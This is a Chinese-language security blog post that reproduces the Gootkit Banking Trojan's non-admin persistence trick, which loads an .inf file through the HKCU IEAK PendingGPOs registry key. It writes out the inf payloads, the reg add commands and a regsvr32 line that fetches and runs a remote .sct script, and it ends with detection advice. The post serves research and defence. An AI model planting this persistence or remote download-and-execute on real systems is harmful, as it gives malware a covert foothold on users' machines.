---
layout: post
title: GookitBankingTrojan中的后门利用分析
---


## 0x00 前言
---

Gootkit Banking Trojan在2014年被首次发现，最近Daniel Bunce（@ 0verfl0w_）介绍了一些对于Gootkit Banking Trojan的分析，文章地址如下：

https://www.sentinelone.com/blog/gootkit-banking-trojan-persistence-other-capabilities/

其中，Gootkit Banking Trojan使用的后门启动方法是独有的，所以本文仅在技术研究的角度复现Gootkit Banking Trojan使用的后门启动方法，分析利用思路，给出防御和检测的建议。

## 0x01 简介
---

本文将要介绍以下内容：

- 原理介绍
- inf文件的基础知识
- 复现后门启动方法
- 分析利用方法
- 检测和防御建议

## 0x02 原理介绍
---

explorer.exe在运行时会加载特定的组策略对象(GPO)，其中包括Internet Explorer Administration Kit(IEAK)的GPO

如果通过添加注册表的方式为IKAK创建一个Pending GPO，指向一个inf文件，那么在explorer.exe启动时，就会加载这个Pending GPO，执行inf文件中的内容

这个方法的优点是不需要管理员权限

## 0x03 inf文件的基础知识
---

inf全称Device INFormation File，是Microsoft为硬件设备制造商发布其驱动程序推出的一种文件格式

对大小写不敏感

文件格式：

由多个节组成，节名用方括号括起来

值得注意的节：

### 1.Version节

inf文件都包含这个节，用来描述支持的设备类型和适用的操作系统

`signature="$CHICAGO$`表示该inf文件适用于Windows98之后的所有操作系统

`signature="$Windows NT$"`表示该inf文件适用于Windows 2000/XP/2003操作系统

### 2.DefaultInstall节

默认情况下首先执行该节内的内容，通常包括文件拷贝、删除，注册表键值的更新，子键删除等功能，还支持执行命令：

- RunPreSetupCommands，本节中指定的命令在安装服务配置文件之前运行
- RunPostSetupCommands，本节中指定的命令在安装程序完成服务配置文件后运行
- RunPreUnInstCommands，本节中指定的命令在卸载程序开始之前运行
- RunPostUnInstCommands，本节中指定的命令在卸载程序运行后运行

参考资料：

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries

例如一个分别执行cmd命令和弹出计算器的test.inf文件示例：

```
[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5,"advpack.dll"
[DefaultInstall]
RunPreSetupCommands=Command1
RunPostSetupCommands=Command2
[Command1]
C:\WINDOWS\SYSTEM32\calc.exe
[Command2]
C:\WINDOWS\SYSTEM32\cmd.exe
```

命令行下的启动方式：

```
rundll32.exe advpack.dll,LaunchINFSection test.inf,DefaultInstall
```

执行后先弹出计算器，关闭计算器后，再弹出cmd.exe

## 0x04 后门启动方法复现
---

1.使用测试程序putty.exe，保存位置： `c:\test\putty.exe`

2.新建putty.inf，内容如下：

```
[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5,"You need a new version of advpack.dll"

[DefaultInstall]
RunPreSetupCommands=Command1:2
[Command1]
c:\test\putty.exe
```

3.新建注册表项

- HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Count, REG_DWORD，1
- HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Path1，REG_SZ，"c:\test\test.inf"
- HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Section1，REG_SZ，"DefaultInstall"

**注：**

原文中Section1的值为`[DefaultInstall]`，经测试，此处存在bug，正确的值应该为`DefaultInstall`

注册表设置如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-10/2-1.png)

4.重启系统

系统启动后执行putty.exe，复现成功

**注：**

系统重启后该注册表会被清除，为了保证下次重启系统时再次触发后门，需要再次修改注册表，添加对应的键值，可供参考的cmd命令如下:


```
reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Count /t REG_DWORD /d 1
reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Path1 /t REG_SZ /d "c:\test\test.inf"
reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Section1 /t REG_SZ /d "DefaultInstall"
```

## 0x05 方法优化
---

### 1.inf文件不需要同要启动的exe文件同名

inf文件名称可以任意，例如test.inf

**注：**

原文描述需要inf文件同exe文件同名

### 2.inf文件内容格式不固定

`AdvancedINF=2.5,"You need a new version of advpack.dll"`可修改为`AdvancedINF=2.5,"11111111"`

### 3.inf文件的payload不唯一

还可以实现文件拷贝、删除，注册表键值的更新，子键删除等功能

如果是执行命令，可以同sct结合实现无文件落地，例如实现远程下载执行的文件内容如下：

```
[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5,"advpack.dll"
[DefaultInstall]
RunPreSetupCommands=Command1
[Command1]
regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
```

## 0x06 利用分析
---

优点如下：

1.不需要管理员权限，只需要普通用户权限即可

2.payload扩展性高，同其他方法结合(如sct)可实现远程下载执行，不需要向硬盘写入文件

## 0x07 检测和防御建议
---

监控注册表位置：`HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs`

默认配置下，系统不存在注册表项：`HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy`

**注：**

修改注册表`HKEY_LOCAL_MACHINE\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs`不会触发这个后门

## 0x08 小结
---

本文复现了Gookit Banking Trojan中的后门启动方法，分析利用思路，给出防御和检测的建议。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


